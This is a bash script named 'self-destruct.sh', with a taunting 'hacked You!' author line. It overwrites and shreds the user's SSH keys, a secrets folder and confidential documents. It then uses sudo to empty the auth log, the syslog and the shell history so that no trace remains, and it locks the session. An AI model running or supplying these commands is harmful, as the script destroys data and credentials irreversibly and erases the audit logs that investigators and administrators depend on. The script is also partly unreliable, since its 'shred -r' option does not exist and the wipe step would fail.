#!/bin/bash
# self-destruct.sh
# Company: Innocent Michael Network Inc.
# Author: Flaming Sniper hacked You!
# Purpose: Securely destroy selected data and vanish from logs

TARGETS=("$HOME/secrets" "$HOME/.ssh" "$HOME/Documents/confidential")
LOGS_TO_CLEAN=("/var/log/auth.log" "/var/log/syslog" "$HOME/.bash_history")
OVERWRITE_PASSES=3

echo "☠️  Initiating self-destruct protocol..."

# Overwrite and delete targets
for TARGET in "${TARGETS[@]}"; do
  if [ -e "$TARGET" ]; then
    echo "🔥 Wiping $TARGET..."
    for ((i=1; i<=OVERWRITE_PASSES; i++)); do
      find "$TARGET" -type f -exec sh -c 'dd if=/dev/urandom of="{}" bs=1M count=1 conv=notrunc status=none' \;
    done
    shred -zufr "$TARGET"
    echo "✅ $TARGET destroyed."
  fi
done

# Clean logs
echo "🧹 Scrubbing traces..."
for LOG in "${LOGS_TO_CLEAN[@]}"; do
  if [ -f "$LOG" ]; then
    sudo truncate -s 0 "$LOG"
    echo "🧼 $LOG wiped."
  fi
done

# Lock session
echo "🔒 Locking shell..."
gnome-screensaver-command -l 2>/dev/null || loginctl lock-session 2>/dev/null || echo "No lock mechanism found."

echo "💀 Self-destruct complete. Nothing ever happened."
